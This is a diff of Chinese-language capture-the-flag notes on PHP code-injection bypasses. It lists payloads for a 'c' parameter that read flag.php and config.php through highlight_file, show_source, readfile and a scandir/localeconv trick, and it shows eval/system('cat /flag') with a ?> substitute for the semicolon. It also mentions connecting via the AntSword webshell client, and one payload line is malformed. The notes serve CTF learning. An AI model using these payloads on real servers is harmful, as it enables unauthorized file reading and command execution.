@@ -3,8 +3,21 @@ u在线php运行：<https://www.jyshare.com/compile/1/>
 
 
 ## **php常见特殊函数和绕过**
-highlight_file("config.php");        //文件内容包含高亮。
+**文件包含函数**
+如果是$_POST，直接蚁剑连
+c=highlight_file("config.php");        //文件内容包含高亮。
+c=show_source('flag.php');
+c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
+c=print_r(scandir(dirname('__FILE__')));
+// ( [0] => 。 [1] => .. [2] => flag.php [3] => index.php ) 
+c=var_dump(file('flag.php'));
+c=readfile('flag.php');
+c=print_r(file('flag.php'));
+c=show_source(file(''flag.php));
+c=echo file_get_contents('flag.php');
 
+^
+**代码执行函数**
 eval('system('cat /flag'); ');         //会将字符串当作PHP代码执行，注意分号。
 
 eval('system('cat /flag')?> ');    // 分号可以用?>替换。 且后面代码也会正常执行。
